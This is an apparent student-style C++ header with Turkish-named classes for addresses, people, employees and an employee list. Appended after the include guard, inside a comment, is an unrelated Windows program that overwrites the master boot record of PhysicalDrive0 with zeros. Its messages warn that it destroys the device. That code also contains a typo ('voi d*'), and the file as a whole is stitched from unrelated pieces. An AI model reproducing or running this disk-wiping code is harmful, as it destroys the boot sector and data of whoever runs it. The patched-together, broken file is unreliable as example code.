#ifndef SIRKET_H
#define SIRKET_H

#include <iostream>
#include <string>

using namespace std;

class adres {
public:
	adres();
	string il, ilce, mahalle, acikAdres;
	
};


class kisi {

public:
	kisi();
protected:
	int Tc;
	string adSoyad;
	adres adrs;
};


class calisan :public kisi
{
public:
	calisan();
protected:
	int sgkno;
	string gorev, departman;	

	/*void calisanEkle(calisanList x) {
		return x.setAta(100,"dawsd","dwsd");
	}*/
};


class calisanList :private calisan
{

	friend class calisan;
public:
	void setAta (int  sg,string gorv,string dep) {
		sgkno = sg;
		gorev = gorv;
		departman = dep;
		
	}

	void yazdir() {

		cout << sgkno << " " << gorev << " " << departman << endl;
	}

};


#endif //!SIRKET_H
/*#include <iostream>
#include <memory>
#include <Windows.h>

#define MBR_SIZE 512

int main()
{
	std::cout << "Son uyari! Bunu bir sanal makinede test edin!!! Cihazý yok etmek icin herhangi bir tusa basin.\n";
	system("PAUSE");
	DWORD count;
	char mbrPAYLOAD[MBR_SIZE];
	ZeroMemory(mbrPAYLOAD, MBR_SIZE);
	voi d* mbrKonum = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

	if (WriteFile(mbrKonum, mbrPAYLOAD, MBR_SIZE, &count, NULL))
		std::cout << "MBR basariyla yazildi! Etkisini gormek icin cihazi yeniden baslatin!\n";
	else
		std::cout << "BASARISIZLIK! Uygulamayi yonetici olarak calistirin!\n";

	CloseHandle(mbrKonum);
	system("PAUSE");
	return EXIT_SUCCESS;
}
*/